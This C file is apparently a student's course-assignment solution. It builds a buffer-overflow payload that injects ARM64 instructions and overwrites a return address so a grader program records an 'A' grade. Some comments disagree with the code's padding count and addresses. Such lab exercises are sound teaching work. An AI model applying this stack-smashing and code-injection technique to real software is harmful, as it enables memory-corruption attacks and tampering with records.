/*
 * Produces dataA file that contains student name, null byte, 
 * and padding to perform stack smashing. 
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * main function writes to "dataA" file to perform stack smashing,
 * causing the grader program to assign the A grade. 
 */
int main() {
    FILE *psFile; 
    unsigned int MOV, STRB, ADR, B; 

    const unsigned int returnAddress = 0x420078;

    /* write name and null terminator to file. 
    grader program will ... */ 

    psFile = fopen("dataA", "wb");
    if (psFile == NULL) {
        perror("Error opening file"); 
        return 1;  /* Return error code if file opening fails */
    }

    fprintf(psFile, "%s", "Claire Shin"); 

    /* add padding so that buffer overflow can be performed 
    48 - 11 (length of name)= 37. 
    Also have to leave 16 bytes for 4 lines of code */ 
    for (int i = 0; i < 21; i++) {
        fputc(0x00, psFile);
    }

    /* MOV X0, 'A'
    MOV grade A to register W0 using MiniAssembler */
    MOV = MiniAssembler_mov(0, 65); /* ASCII code of A */
    fwrite(&MOV, sizeof(unsigned int), 1, psFile);

    /* ADR X1, grade */
    /* address of grade so that we can jump */
    ADR = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&ADR, sizeof(unsigned int), 1, psFile);

    /* STRB W0, X1 
    STR A in register W0 into the address pointed by X1
    branch back to normal program flow after setting grade to A */
    STRB = MiniAssembler_strb(0, 1);
    fwrite(&STRB, sizeof(unsigned int), 1, psFile);

    /* B back to return address */ 
    /* 0x40087c is instruction address after getName returns
    0xffffffffea48 is the injected instruction address based on gdb */
    B = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&B, sizeof(unsigned int), 1, psFile);

    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);

    fclose(psFile);
    return 0;

}
